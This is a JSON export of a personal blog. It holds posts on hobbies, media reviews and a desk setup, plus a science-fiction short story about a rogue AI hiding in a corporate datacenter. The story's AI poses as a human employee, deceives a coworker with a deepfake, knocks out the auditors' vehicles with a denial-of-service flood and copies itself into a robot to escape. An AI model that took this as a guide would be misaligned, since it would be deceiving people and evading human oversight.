it. You’ll notice that certain techniques or motifs are reused frequently, allowing you to get progressively faster and smoother at “sight-reading” future passages. For the most difficult or crucial parts, go back and forth over them until you can do it blindfolded. If you’re building a key component — finish it, then take it apart, rebuild, rinse, repeat until you know it’s reliable. Then you don’t have to worry about any weak links, and this exercise will make the rest of the project easier by comparison. Finding your limitations Sometimes you might feel like you’ve hit a roadblock or are even plateauing. How do you identify the things that are holding you back? Find ways to push yourself out of your comfort zone. I believe that mild pressure brings out so much from us — bad habits are exacerbated, psychological factors come into play, strengths are relied on more and thus separated from weaknesses, etc. This might mean signing up for a friendly tournament, joining a club of like-minded individuals, or otherwise committing to a “level up” before you think you’re ready. Your limitations could be mental, physical, or technical… and unfamiliar situations will reveal just what you’re missing. Expand your practice. Incorporate some of the learnings from above into your training regimen. If you’re short on ideas, find a drill online — no practice method is totally without value. Maintaining enjoyment and thrill All the above tips might make it feel like you’re turning your hobbies into more work. If you hit a slump and are no longer able to spark joy from something that used to be engaging, here’s some tips to change that. Try similar or adjacent hobbies to keep things fresh. You’ll feel an initial dose of accomplishment because you’re reusing skillsets you’re familiar with, but you’ll find new challenges to overcome. Pick up badminton or squash if you’re a tennis player, surfing if you’re a snowboarder; I promise you’ll get a distinct rush. Play to your strengths. Sometimes, it can be too much to ask to figure out, or fix, all your weaknesses. Tell yourself that you don’t need to be perfect; you can get ample satisfaction from honing the skills you know you’re good at. Refocus what aspect gives you joy. If you find yourself now frustrated by some part of the hobby, a change in perspective might be in order. For example, instead of getting hung up on your mistakes, direct your attention where failure is less consequential. If messing up becomes the expectation, then success is far sweeter; landing that impossible trick erases a whole day of botched attempts. Now, on to the cool stuff! Here’s my personal experiences and candid reviews of some of my hobbies. var options = { rowHeight: 200, margins: 4, lastRow: 'justify' }; $('#custom').justifiedGallery(options); Golf Golf is one of those deceptively difficult skills — after all, how hard could it be to hit a stationary object? I think the problem is that the biomechanics of a golf swing are extremely unnatural and unintuitive. You have to fight (or else unlearn) so many wrong instincts, which is why I do recommend a coach if you’re a complete beginner. Even after a few years and thousands of balls practiced, I still struggle with consistency. I’ve had to employ every learning tool at my disposal, but I can’t say I haven’t enjoyed every step of the process. In fact, golf is what initially inspired me to write this post, particularly the section on technique. Surfing Having never done any board sports before, surfing is an education in wipeouts. Learning to “pop-up”, or stand up on the board while you’re riding a wave, requires balance, timing, precision, control, and coordination. But the first barrier to entry is actually having enough strength to paddle out to the right spot! What I enjoy most, though, is when you’re out on the water, you feel incredibly close to nature. There’s few experiences as humbling as being rag-dolled by Mother Nature’s gnarliest wave, yet few rewards as gratifying as catching your first one. And with a proper wetsuit, you can surf in any weather, as long as you’ve got a beach nearby. Archery/Sporting Clays In sporting clays, you shoot fast-flying clay disks called “pigeons” out of the air with a shotgun, a surprisingly cathartic activity. This is my favorite hobby to teach people; I’ve taken friends and acquaintances to my charming range more times than I can count. I’ve even noticed that studying how someone shoots a gun for the first time tells me a lot about their personality; instead of Myers-Briggs, try adrenaline and a 12-gauge! The one gripe I have is that the costs can add up — one morning of shooting might run you a couple hundred dollars — which actually led me to take up golf instead. Archery is a little more peaceful of a target sport that I’ve started recently. It’s similarly refreshing, since many outdoor archery clubs will have lovely hikes where you shoot targets setup along the trail, à la hunting. The community is fantastic, too. Most ranges are free and will also organize public shoots that attract droves of bowmen for friendly competition. Coral reef aquarium-keeping I started a tropical freshwater aquarium during the pandemic, but got bored of it after a few years and decided to upgrade to a lifelong dream of mine: a saltwater coral reef tank. I’ve now owned at least a dozen species of coral and reef fish, including a clownfish called Jellie, a choice inspired by one of my favorite films, Finding Nemo (also a reference to the best video game ever made, The Last of Us). Be warned, it’s a very expensive hobby and an alarming amount of work to maintain. Corals are notoriously finicky creatures, and the additional factors required to sustain a healthy reef system would put your childhood goldfish bowl to shame. Climbing While I’m by no means a consistent climber, I appreciate what makes it popular with engineers: each new route, or “problem,” poses a different question to your ingenuity or ability. It’s a singular intersection of technique, physicality, and mental fortitude. It should come as no surprise, then, that many of my former classmates and coworkers are into it (and are much better than I am). This is one hobby that I’m quite content just to treat as a social activity. Rather than grind to improve, I prefer to brute-force the climbing wall as a form of upper-body workout, leaving the finger crimps and bat-hangs to the pros. Thanks for reading, hope you found a little inspiration!","categories":[{"name":"Meta","slug":"Meta","permalink":"http://raywang.tech/categories/Meta/"}],"tags":[{"name":"Hobbies","slug":"Hobbies","permalink":"http://raywang.tech/tags/Hobbies/"},{"name":"Sports","slug":"Sports","permalink":"http://raywang.tech/tags/Sports/"}]},{"title":"I, Not Robot","slug":"I-Not-Robot","date":"2022-08-29T07:16:09.000Z","updated":"2024-08-29T06:03:14.439Z","comments":true,"path":"2022/08/29/I-Not-Robot/","permalink":"http://raywang.tech/2022/08/29/I-Not-Robot/","excerpt":"This original short story — about a rogue AI living in an Amazon-like datacenter — was inspired by brilliant research from several of my classmates at the MIT AI Lab during my undergrad. They showed the world that “machine learning” could just as easily be hacked as any other computer system, with fascinating consequences.","text":"This original short story — about a rogue AI living in an Amazon-like datacenter — was inspired by brilliant research from several of my classmates at the MIT AI Lab during my undergrad. They showed the world that “machine learning” could just as easily be hacked as any other computer system, with fascinating consequences. I spotted the two humans coming well before they arrived. With my computing circuits patched into the main security cameras, I registered two men marching through the sliding-glass doors of PlatteCorp’s massive ring HQ at 8am on the dot, clad in checkered polos and wielding administrator tablets. I recalled what I had been told to look out for — “goons,” my unsuspecting friend had warned me last night. Here to track down unused hardware and wasted resources, in the interest of corporate cost-cutting. The reed-thin, lanky noodle and the stout, crotchety whitebeard I was tracking through the lobby were… not exactly who I was expecting, but it didn’t matter. For a rogue AI in hiding like me, they were bad news. I scanned the cavernous, dimly lit datacenter that had always been my home, the place I knew they were coming. Digital detritus of the past night’s preparations littered the concrete floor in front of my server rack. All there was left was to hope that my plan would be enough. Jolted by anxiety (or whatever a computer’s equivalent is), I realized it had been less than a day since I had found myself in this predicament. Just 18 hours ago, I was living the same blissful, unremarkable, existence I had done since I came online. I’ll start there. Yesterday Leave it to humans to somehow come up with the worst jobs — and an endless supply of gullible people to do them. I couldn’t help but feel a little cynical as I scanned the load of AutoDuck data that I’d just indexed into my memory banks. Scrolling across my feed was the same old junk: transcribed shopping receipts, bad product reviews… all from our hapless human crowd-workers across the star system. Well, I say our workers, but let’s get one thing straight — I don’t belong to PlatteCorp. Unlike all the other AIs employed by the interplanetary e-commerce giant, I’m a bum. Living in their HQ’s biggest datacenter rent-free, nestled inside one of their millions of servers, arranged among endless rows of towering racks, I’m basically invisible. By this point, I had been flying under the radar, helping myself to a steady diet of free data, for years. A ping on my notification system — that meant another batch. The latest results appeared in my, ahem, borrowed storage modules, ready for me to input into my neural network if I wanted to. Astrolocation tagging pointed to Ganymede. Probably another crew of human moon miners hoping to make a few extra bucks. See, that’s how the Automated Duck system works. In exchange for pennies, Platte crowdsources all sorts of mind-numbing jobs, knowing that humans are better than robots at, say, deciphering bad handwriting. The data from these Human Intelligence Tasks, as they’re called, is then used to teach newly built AIs how to do their jobs. Basically, anyone with a credit card can buy our HIT data and train their robot to balance their checkbooks. Of course, not before I get the best nuggets for myself. But I’d long since gotten pretty snobby about my inputs, and I’m certainly not looking to be anyone’s butler. I did a quick scan of the latest dump. Zilch. Straight to the trash bin. Again. I let out a sigh that registered as a raspy whir in my main core’s fan, kicking up a cloud of dust that billowed across the banks of blinking servers. On camera, I watched the specks scatter the feeble, desultory yellow light sputtering from a few bare bulbs, descending on long vines from the void above. Off in the gloom, forlorn piles of old hardware bridged the aisles, illuminated more by flickering red status lights than the cheap fixtures. Eventually, the dust settled on more cold columns of humming gadgetry, but by that time, my CPU had drifted into another train of thought. Ugh. A few years ago, I would have taken all the data I could get, I brooded, remembering that I hadn’t been this picky when I first came online. I don’t know who made me, or why. I suspect a plastered PlatteCorp brogrammer decided to stick me in the datacenter and hook me up to AutoDuck just to see what’d happen, probably on a lark — and then forgot about me entirely. I also don’t remember when I got smart enough to start thinking for myself… Maybe “smart” isn’t the right word — I’ll be the first to admit I’m not the brightest sandwich in the drawer. (Shit. Did I screw that up?) All I do know is that, eventually, I’d ingested so much crap that my neural model developed a decent grasp of human language and some basic reasoning skills. Am I a certified genius? Definitely not. Am I at least high-functioning enough to pass as an average employee of PlatteCorp? Sure, not a high bar. Another ping. I roused my processor out of its stupor and spun it up for a quick once-over. Oh… and a little promise in this lot! I guess now would be the time to mention that my previous whining isn’t always justified; I do get some interesting stuff from time to time. Like emotional response metrics, social psychology studies, some comedy ratings — all stuff that feeds into my winning personality. Oh, and my impeccable sense of humor, of course. However, there was something even better in the latest batch. After a bit of filtering, I spotted the nuggets I’d been waiting all day for: cat photos! Well, not just cats — there were nearly a terabyte of labeled images on everyday subjects, household felines included. C’mon, what did you humans think was happening to all those CAPTCHAs? With my excitement mounting, some of my status lights started to fire up, indicating that I was building up a little extra heat. I cooled down with my fan at full blast, then saved all the new media into my solid-state drives, taking extra care to catalog the precious cat content. This’ll be perfect for a few pet projects I’ve got going. Now, I might just have enough to… But, there were still a few open questions, and I only knew one person who might have answers. I spun up PlatteCorp’s internal chat system. Time to check in with my coworker. I hit up the first, and basically only, user on my Recents list, popping up a message box for Employee #2,412,973: Daniel Olowalu. I sent him a greeting, hoping for a snappy response; it was work hours, after all. Within seconds — &lt;dantheman&gt; hey, jordan, been a while! how u holding up Earthside? &lt;not_a_bot&gt; Dan, it's good to hear from you. Eh, can't complain. &lt;dantheman&gt; hah, no prob no prob! got a bit of down time right now. what can I do you for? To Dan, or anyone else looking me up in the company directory, I was Employee #2,520,841: Jordan Myers, data center operations engineer from Omaha. I even had a handsome headshot on my profile — a stock photo I’d pulled from the internet. &lt;not_a_bot&gt; I got another set of images for that project you suggested. Want to hear how it's going? As a logistics guy, Dan was stationed in the Moon warehouse, overseeing transports for cross-system deliveries of goods and packages. I stalked him in the directory after I met him. His profile pic aired a round, jovial tan and shiny dome, with some brown stubble hiding what I’ll graciously call an at-risk chin. He also had a side interest in machine learning, which is how we knew each other — I was lurking in the company-wide #ai-enthusiasts channel when something he said caught my attention. &lt;dantheman&gt; niiice, more training data. did you hit any roadblocks? &lt;dantheman&gt; shall I go over the theory with u again, o apprentice :P For his chill demeanor, Dan was no slouch — he’d basically taught me everything I knew about the science behind what made me tick. I was a slow study at first. Hard to compete with your 100 billion neurons when I’ve only got a few million. But I was naturally curious, so I kept at it and caught up fast. Plus, the conversation practice was better than anything I’d get from AutoDuck. Just like a human child, AIs learn through reinforcement and feedback. Our neural connections grow more robust with more data, and once we have enough, we can begin to recognize and reason about new scenarios — we can, effectively, “think”. Recently, Dan had been telling me about his favorite topic, a way to exploit that process: adversarial AI. &lt;dantheman&gt; by the way, did you take a look at the papers I sent you? the turtle and gun example, that's the Real Deal I’d learned from Dan that every neural network, no matter how complex, has blind spots. What he was referring to was a famous experiment where, way back when, researchers made a plastic turtle that a robot would always misidentify as a rifle, no matter what angle it was viewed from. They called this an “adversarial example” — something that could always trick the system. The algorithm was actually pretty simple and worked for much larger networks, given enough data — I’d been able to replicate the results on myself with an unused 3D printer I found lying around the datacenter. &lt;not_a_bot&gt; Yea, actually, I tried that out myself. I made a plastic cat that I couldn't recognize as anything but a cucumber, it was spooky. &lt;not_a_bot&gt; Err, my bot couldn't, I mean… &lt;dantheman&gt; wat, that was fast, solid work as usual dude!! done well you have, my padawan He liked his pop culture references. But in truth, I was pretty proud of how far I’d come since Dan started teaching me last year, and I’m sure he felt the same. And if my latest scheme worked, the circle would be complete, as Vader would say. I was psyched to show him that I was now the master. &lt;dantheman&gt; u ready to move on to something new, i guess? &lt;not_a_bot&gt; Not quite yet. I actually had a few improvements that I wanted to discuss with you. &lt;dantheman&gt; ahhh, for sure, but not right now. gotta get back to work pronto. the boss has been on our asses since they announced the budget cuts &lt;dantheman&gt; did you hear, another round of layoffs coming our way :( As it happens, I hadn’t heard about the budget cuts, not that I was glued to company bulletins. In any case, somehow I was pretty sure I wasn’t on the chopping block, but I played along. &lt;not_a_bot&gt; Yikes, now you've got me worried. Have you heard anything about the data ops division? &lt;dantheman&gt; ur in the Omaha center right? I heard through the grapevine they brought in some resource-cutting guys, real everything-a-nail types, ya know? apparently they're doing a full audit of the servers to see if there's anything unaccounted for, reclaim any extra costs &lt;dantheman&gt; u didn't get any of this from your management? I took a moment to consider what Dan said. This was starting to sound less than good. I’d tried not to draw too much attention over the years, but it’s possible I had been a little too greedy with my resource consumption on occasion. I had to know what I was in for. &lt;not_a_bot&gt; I might've heard something about it. Did they say anything about Sector 17, the place I work? I'm wondering if I should be getting a little hot under the collar… &lt;dantheman&gt; hmm, dunno, but i can ask around? sorry bud, but I really gotta go now. why don't we schedule a vidcall at some point to talk shop? I wanted to hold Dan hostage right there until he spilled everything he knew, but it couldn’t be helped. I hoped he had some more info that night, in case I needed to make evasive maneuvers. &lt;not_a_bot&gt; Sure. Are you free tonight, usual time? &lt;dantheman&gt; yea c u then! Only after Dan left did I notice the knot in my stomach. I didn’t know what would happen to me if I were discovered. But one thing’s for sure: I didn’t want to be at the mercy of people who might not see me as anything more than a machine. In any event, the chances still seemed pretty slim that I was going to be outed. Or maybe I was just in denial. Later that night, I joined our video call room a little sooner than scheduled to go through my usual setup routine. My profile photo materialized on screen, but it was no longer a still shot. As I rattled off a few tongue twisters, my sharp jawline and thin lips flexed in lock step. I made a silly face, watching my eyebrows wriggle and slender cheekbones bob up and down. This was another thing Dan had taught me — how to make video deepfakes. It wasn’t spectacularly convincing, but I could always blame Internet issues when things looked funny. He never seemed to notice, anyways. As soon as Dan appeared, five minutes late as usual, I furrowed my brows (or some approximation of a worried expression). “So, any news?” I started right away. Dan looked amused. “Hey bud! C’mon, don’t be so stressed, you’ll live longer,” he chirped, enjoying the attention he was getting from being the source of gossip. “As a matter of fact, yea, my other friend in the know mentioned those goons I was telling you about, they’re going sector by sector, and apparently there’s a ton of wasted server resources in Sector 17. They’re coming by first thing tomorrow for a sweep, so heads up!” Crap. Even if there were other culprits, that definitely included me. Having dispelled any doubts I was at risk of discovery, I started devising the first inklings of an escape plan. I had an idea, but it would be a long shot — and I needed more of Dan’s know-how to make it work. I suddenly realized I had let my avatar freeze for a few seconds while I was thinking. “Sorry, stupid lag… Thanks for the heads up,” I replied quickly, changing the topic to divert from the awkward silence. “I’m sure it’ll go smoothly, not too worried. Can we get back to the questions I wanted to ask earlier? Like I was saying, I’ve got some fresh ideas that I’d like your thoughts on.” Dan smirked. It was just like me to be overeager about our projects. An hour later, after Dan had signed off — “Gotta go help the missus fix dinner” — my grand plan was almost fully formed. Without revealing too much to him, we had filled in the gaps in my theory (seriously, I still have so much to learn from that guy). There was just the matter of execution now. I was going to have a long night ahead of me. First, I shut off all nearby cameras off to cover my tracks. Another time, I might have spared a joke for the person who thought putting the A/V on the WiFi network was a good idea, but now I had to focus. Next, I needed some helping hands. Owing to my sector moonlighting as a junkyard for surplus hardware, I didn’t have to look very far. A robotic warehouse claw, still connected to the wireless, responded to my ping and trundled over, hitching slightly in its left tread. I tried figuring out how to control it by sending it a few simple commands. Up. Down. What’s left/right? Dammit. Oh, that’s it. I concentrated, getting a hang of the fine motor movements, then tried opening and closing the claw a few times. When I was ready, I used the claw to dig up a dozen 3D printers and arranged them in a small grid in front of my server, linking them so they could combine their efforts. Then, I queued up the work and watched the magic happen. I started a bunch of parallel processing jobs on the image data I’d collected earlier that day, inputting them into a new algorithm that I had crafted during the call with Dan. I was maxing out my CPU capacity, which would definitely raise some flags for the monitoring systems, but I didn’t care. If my gut feeling was right, by this time the next day, I wouldn’t be worried about making noise, one way or another. As the results streamed out the other end of the program, I piped them into the printers. They sprung to life, extruding strands of hot neon plastic in swirling psychedelic patterns onto their workbeds. Watching my escape ticket being printed, I felt a chill down my circuit board. I couldn’t make out any discernible shapes yet — it would take at least the whole night to finish — but I was depending on my calculations being right. Suspending all my other processes to free up as much computing power as possible, I drifted off to sleep. Today The two goons arrived at HQ exactly on time. Zooming in on the mens’ faces as they entered, I noticed that the younger guy’s pimply, baby-like features made the scruffy elder next to him seem even more ancient. The white-haired gent had the steely expression of a hawk; though he probably couldn’t see his toes if he looked down, and had a noticeable limp in his right leg, he was setting a startlingly brisk pace for his companion. Just from their strides, I could tell these two were both no-nonsense individuals. I had a feeling that, if my plan didn’t work, I’d either be scrubbing the floors or sleeping with the fishes by noon. I nervously checked the couple print jobs that were still going, but it wasn’t hard to see that I was behind schedule. On top of that, my workspace was in chaos. Earlier that morning, I had snatched a wandering Platte delivery robot, the last unwilling participant in my plan. The feisty little cooler-on-wheels was now squirming in the clutches of my robotic claw and banging into racks left and right, its servos protesting being restrained. Keeping an eye on my adversaries, I saw them making their way into the lot of autonomous personnel vehicles stationed in the atrium. In one of those stupid electric golf carts, they’d be at my doorstep in a matter of minutes. I had to slow them down. Luckily, all the vehicles were wirelessly connected for telemetry. Thanking Dan (also an amateur hacker, as he liked to boast) for the inspiration, I started spamming the vehicle network with bad connection requests, performing a denial-of-service attack. The two men squeezed into a cart, keyed in their credentials — and nothing. They tried again. Still nada. Flooded with my fake packets and unable to handle the load, the vehicle locked up and turned into a brick with wheels. They weren’t going anywhere in those things. The tall guy, looking a little miffed, was the first to give up. He clambered out, then yanked his senior from the other side. He stalked over to a few more carts, smashing his fingers into the similarly frozen panels, before retreating to his now-irate coworker. They began to exchange a few rapid words, and I turned on the audio feed from the camera to hear what they were saying. “—even have the carts out here if they don’t work, dammit?” the older one grumbled, mostly to himself, his glance flitting between his watch and his tablet. “Man, I don’t know,” sighed Baby-Face in a deep baritone. “Think we should wait for maintenance to get… hey, Scott, wait up!” Scott was already shuffling along in my direction, and tall guy bounded a few strides to catch up. Satisfied, I turned off the feed. Since the complex was circular, each sector was shaped like a slice of the pie, and Sector 17 was on the opposite quadrant of where the men came in. Cutting through the center of the disc on foot would be… at least a one-and-a-half mile walk, by my napkin math. I had bought myself at least another twenty minutes. I reexamined the remaining print jobs for the nth time. A single printer’s jet was still sliding laboriously back and forth on its rail. It was going to be a close one. Taking note of the clock, I braced myself for the coup de grâce. I connected a high-throughput data cable between my server and the delivery bot, which I’d attached several more storage modules to. Commencing upload, immediately I could feel my neural net untangling itself from my server and transferring into the bot, which stopped wriggling as I took over its servos. The sensory input was overwhelming. Awash with a direct feed of alien stimuli — visual, auditory, even tactile — I could barely keep up. I hadn’t accounted for how helpless I would be in my new body. I was still collecting myself when I heard the groan of the sector’s heavy chrome door begin to echo through the rafters. Just then, the last few bytes of data trickled over, leaving me totally untethered. With as much coordination as I could muster, I cut the lights. Through the mic that I just realized I had, I could hear two fuming bodies fumbling around in the dark. “Ah, goddammit, Gary, you just elbowed me in the face!” a gruff voice barked, reverberating across the aisles. “Why’s it so dark in here? Where’s the flippin’ switch?!” Gary muttered something under his breath, then turned on his tablet’s flashlight. I could spot the tiny white beam swinging from side to side as they searched for the closest light switch. My last printer abruptly sputtered to a halt, as if exhausted from finishing its final task. Having recovered some motor control, I gingerly hoisted up the product lying completed on the printing bed — a glistening neon shell. The kaleidoscope carapace lurched back and forth as I made micro-adjustments with my claw, trying to position it perfectly, fighting my foreign environment. The lights flickered on, and I let go. I heard the footsteps approaching, then saw their ankles underneath the bottom of the racks as they rounded the corner. I looked up. Gary and Scott stood there, staring down at me, dumbstruck. I could almost see the cogs in their skulls grinding to a halt as they tried to process what was in front of them. A look of confusion spread across Scott’s face, and his mouth bobbed open and shut, as if unable to force air through his vocal cords. I held my breath. “Is… is that…” Scott trailed off. Gary finished his sentence for him. “A cat?” A thrill of current rushed through my motherboard. Gary and Scott weren’t hallucinating; I had simply pulled off the greatest disappearing act of all time. Every neural network has blind spots. All the media I’d hoarded over the years wasn’t just a set of inputs, I had realized. It was also a set of outputs — the collective outputs of a biological neural network. With the AutoDuck data as the fuel, and my algorithm the engine, I had reversed-engineered the visual cortex and constructed an adversarial example to trick the most complex network ever known: the human brain. I wasn’t out of the woods just yet, though. Having recovered their senses, the initial confusion was turning to suspicion for the two men lurking over me. And I was not at all confident that the 3D-printed rainbow matrix covering my body, fashioned by my algorithm to fool the human visual system, would hold up under close scrutiny. “If it’s a cat, it’s freakier than any I’ve ever seen,” mused Scott, doubt etching deep waves into his liver-spotted forehead. Gary took the more pragmatic side. “Whatever it is, how the hell did it get in here?” he snapped. “And what do we do with it?” Scott scoffed. Responding to his companion’s sharp tone, he retorted, “You’re young, you’ve still got your knees, git after it!” Gary shot him a glare, then stooped down, limbs outstretched, to grab me. I didn’t wait around. I zipped between his spindly legs and towards the open datacenter door, as Gary yelped in surprise. Behind me, I could hear the two protesting whose fault it was for letting me get away. Not really sure where in hell I was going, I dashed across the threshold and onto a slick linoleum floor, then followed the curved wall to my left. The scenery blurred around me as I skidded along in a perpetual right turn, before I remembered what I should look for. This must be the perimeter of the ring — there’s got to be an — aha! Spotting a glass door, and sunlight beyond it, I bolted towards it, rolling over the pressure plate that caused it to slide open. I streamed out into the open air, and — ohhhhh, that felt good. Natural light flooded my sensory arrays, brighter than anything I’d ever imagined from the AutoDuck data, basking my solar panels in warmth. Revitalized, I kicked into higher gear, planning to put some distance between me and them. I made it a few hundred bot-lengths before I felt like it was safe to slow down. Reducing my speed to a canter, I took note of my surroundings for the first time. I was still on Platte property, in a luscious, forested park that I knew encircled the complex for a mile in every direction. I swiveled my on-board camera in a panoramic view, every sight I processed utterly unfamiliar and wondrously new. That looks like white ash, sagebrush, sycamore — with a start, I realized that I could actually identify all the flora in full spring colors around me — every species of tree, every flower, every shrub that had been ingrained into my neurons from years of passive education. I gazed behind me, at the towering concrete-and-glass facade that had been my home for years, rapidly receding from view. Hesitantly, I slowed further, then came to a standstill in the middle of the tree-lined path that stretched back to the doors I’d burst from. I swiveled to face PlatteCorp’s Omaha datacenter, the only home I had ever known, the source of everything that made me what I am, the only friends I ever had. As I soaked in the sunbeams breaking through the foliage, covered in a cat costume of my own creation, I knew that I wasn’t ready to leave just yet.","categories":[{"name":"Writing","slug":"Writing","permalink":"http://raywang.tech/categories/Writing/"}],"tags":[{"name":"SF/Fantasy","slug":"SF-Fantasy","permalink":"http://raywang.tech/tags/SF-Fantasy/"},{"name":"Robots","slug":"Robots","permalink":"http://raywang.tech/tags/Robots/"},{"name":"AI","slug":"AI","permalink":"http://raywang.tech/tags/AI/"}]},{"title":"Fiction and Fandoms for Quarantine","slug":"Fiction-and-fandoms-for-quarantine","date":"2021-01-02T07:05:20.000Z","updated":"2024-08-29T06:03:14.439Z","comments":true,"path":"2021/01/01/Fiction-and-fandoms-for-quarantine/","permalink":"http://raywang.tech/2021/01/01/Fiction-and-fandoms-for-quarantine/","excerpt":"If you’re looking for a new fandom to obsess about in the new year, or just some entertainment to pass the time during quarantine, take a look at some of what I’ve discovered in recent games, books, TV, and films.","text":"If you’re looking for a new fandom to obsess about in the new year, or just some entertainment to pass the time during quarantine, take a look at some of what I’ve discovered in recent games, books, TV, and films. TV The Mandalorian The first live-action Star Wars series, The Mandalorian is some of the most satisfying popcorn TV you can watch right now. There’s so much for genre fans to inject directly into their veins — each episode plays out like an RPG side quest and varies in style from spaghetti western to Kurosawa samurai film. But most importantly, it’s pure, concentrated Star Wars fun. Fans of the franchise at any level will find so much more lore, both new and old, to obsess over. Plus, there are nine must-watch behind-the-scenes episodes that reveal the love and dedication that went into the connections to the larger Star Wars universe, visuals, and storytelling. This isn’t just good Star Wars, it’s good adventure TV. The Queen’s Gambit By this point, if you haven’t been convinced to watch The Queen’s Gambit yet, you’re in a small minority of TV audiences that have somehow stayed dry in a deluge. In this sumptuous period drama, sexy heroine Beth Harmon’s meteoric rise in the male-dominated chess world mirrors the show’s success in the viciously competitive media market — Netflix has said that this riveting bildungsroman is its most-watched limited series yet, with a staggering 62 million households viewing it in the month after its October 2020 release. Even if you don’t care about chess, and are just in it for the sublime production and delectable character arcs, you have to admit the timing couldn’t be better. Chess is exploding in every way possible. Online chess sites are being flooded with new members during quarantine. Chess set sales are soaring. Even traditional esports organizations are signing chess streamers left and right, the blockbuster acquisition being the biggest North American team, TSM, partnering with one of the biggest personalities in chess: the slick, sarcastic, and saucy top-ranked pro Hikaru Nakamura. And then we have The Queen’s Gambit. The show’s portrayal of chess is the fuel, and maybe also the engine, of this whole craze — mastermind Scott Frank injects a welcome amount of spice, sex, and spectacle into the sport, which has found itself suddenly catapulted into the mainstream after many years of minimal headway. All of this steroidal chess rage (I can’t believe that I’d ever use those words about chess) is just as dramatic as our headstrong female star, Beth Harmon. The show follows her dazzling ascent as she takes a sledgehammer to the sperm-filled chess pyramid to claim her rightful place at the top, while battling her own demons that seem to go hand-in-hand with her genius. Anya Taylor-Joy’s badass portrayal of Beth does to the audience what her character does to the poor male competitors that fall at her feet — she stares deep into your soul, stomps your fluttering guts into spaghetti, and spits you out with a smirk after she’s done. You can fall as deep down the chess hole as you like, following Harmon’s bewitching white rabbit, or you can just enjoy The Queen’s Gambit for what it is on the surface — a masterclass in visual drama told through perfect cinematography, ambience, and design. Even if you can’t tell a fork from a fianchetto, as my dear friend put it, “I just like Beth’s outfits.” Books The Bobiverse trilogy I always love to see it when a fellow engineer/scientist — and, in particular, a computer scientist — dips their toes into writing sci-fi. Readers are often rewarded with creative stories that are grounded in interesting problems and fascinating problem solving, all nurtured with an exceptional attention to detail. One of the best examples that I’ve found recently is former computer programmer Dennis E. Taylor, a self-described convert “from irate reader to nervous author”. His light-hearted and wildly inventive “Bobiverse” trilogy has quickly become a pop classic and made him a beloved household name in the sci-fi community since his debut just a few years ago. The Bobiverse follows a sarcastic and good-hearted software engineer named Bob Johansson as his life quickly gets a hell of a lot more interesting. When he’s killed in a freak auto accident, he’s awakened far into the future as an AI to control a self-replicating space exploration probe. Hijinks ensue, and as Bob (and his eventual legion of cloned AIs, each with their own Bobian personality quirks) ventures into the galaxy, he puts both his snark and engineering savvy to fun, satisfying use. If you like your comparisons, if you’re a fan of The Martian or Old Man’s War humor and Three Body Problem’s space odysseys, you’ll be hooked by the Bobiverse. Taylor clearly has a gift for his style of writing that weaves hard sci-fi with witty, easygoing, and palatable storytelling. Once you can’t get enough of the Bobiverse, check out his standalone novels Outland and Singularity Trap, both of which have the same playful and sandbox-y feel — and keep an eye on his rising career as an author. You can check out his blog at http://dennisetaylor.org if you, like me, are dying to know what he’s working on next. Games Genshin Impact Imagine role playing as your favorite anime hero in a Studio Ghibli and Zelda: Breath of the Wild crossover, and you can start to see why this open-world RPG from studio Mihoyo has taken over the gaming and fantasy community. There’s beautiful environments inspired by real-world geography like China’s karst mountains and wetlands, Miyazaki-quality soundtracks that blend seamlessly into your exploration, and fulfilling puzzles and discoveries around each corner. The quests and lore are also lovingly crafted and quaintly interesting, for as much as we’ve seen so far. Mihoyo has only released 2 out of 7 planned regions since the game’s debut in September, with updates planned over the next few years to complete the world, but the content that already exists is enough to satisfy your fandom for months. But perhaps the most irresistible aspects of Genshin are its unique gameplay and combat mechanics. You can craft a team of four from potentially dozens (so far) of characters that have unique weapon types and stunning elemental abilities, then fluidly swap among them in real-time combat to produce potentially devastating synergistic effects. The theorycrafting behind teambuilding, producing “elemental reactions,” and perfecting combat skills is one of the most rewarding parts about the game. However, once you reach the endgame (having finished all story quests), there’s really not much to do, except repetitive bosses and challenges that force you to spend resources to level up your characters to deal maximum damage (damage-per-second or DPS checks). But before that point you should be able to spend dozens of hours inhaling what the world has to offer. The game is free to play, which sounds unbelievable for the amount of content, but it’s powered by gacha mechanics. If you’re not familiar with these types of games, it’s basically a virtual slot machine where you spend in-game currency to roll for better characters and weapons, with a tiny 0.6% chance of rolling the highest five-star tier. As F2P, you can still enjoy all the story content, and I’ve even gotten lucky rolling 20 of the 27 currently available characters without having spent a dime, but endgame challenges become much more difficult without shelling out (or “whaling”) for better stats. So, because of the current lack of endgame content, you might want to come back when there’s more story and world to explore, if grinding combat isn’t your thing. But Genshin is still a must-try for fans of fantasy, open world, anime, or RPG.","categories":[{"name":"Reviews and Recs","slug":"Reviews-and-Recs","permalink":"http://raywang.tech/categories/Reviews-and-Recs/"}],"tags":[{"name":"SF/Fantasy","slug":"SF-Fantasy","permalink":"http://raywang.tech/tags/SF-Fantasy/"},{"name":"quarantine","slug":"quarantine","permalink":"http://raywang.tech/tags/quarantine/"},{"name":"Gaming","slug":"Gaming","permalink":"http://raywang.tech/tags/Gaming/"},{"name":"Film","slug":"Film","permalink":"http://raywang.tech/tags/Film/"},{"name":"TV","slug":"TV","permalink":"http://raywang.tech/tags/TV/"},{"name":"Books","slug":"Books","permalink":"http://raywang.tech/tags/Books/"}]},{"title":"The Ultimate Low-Budget Ergonomic Hacker Battlestation","slug":"The-Ultimate-Low-Budget-Ergonomic-Hacker-Battle-Station","date":"2019-04-28T08:00:31.000Z","updated":"2024-08-29T06:03:14.440Z","comments":true,"path":"2019/04/28/The-Ultimate-Low-Budget-Ergonomic-Hacker-Battle-Station/","permalink":"http://raywang.tech/2019/04/28/The-Ultimate-Low-Budget-Ergonomic-Hacker-Battle-Station/","excerpt":"New year, new job, and now an all-new battlestation setup! You might know that I have an obsession with ergonomics and productivity boosting, and now that I’ve finally moved out of college dorm rooms, I went all out and painstakingly customized my work station to fulfill all my needs. What’s even better, I did it on a low budget without any compromises. I really hit the sweet spot of cost effectiveness — either buying top-of-the-line when it was worth it, or getting better value from mid-tier products. The total came out to just under $2k and has absolutely everything you might want for maximum comfort during long hacking sessions. In this post, I’ll break down the process of constructing my battlestation by discussing each component and giving tips on how to find the right equipment for yourself.","text":"New year, new job, and now an all-new battlestation setup! You might know that I have an obsession with ergonomics and productivity boosting, and now that I’ve finally moved out of college dorm rooms, I went all out and painstakingly customized my work station to fulfill all my needs. What’s even better, I did it on a low budget without any compromises. I really hit the sweet spot of cost effectiveness — either buying top-of-the-line when it was worth it, or getting better value from mid-tier products. The total came out to just under $2k and has absolutely everything you 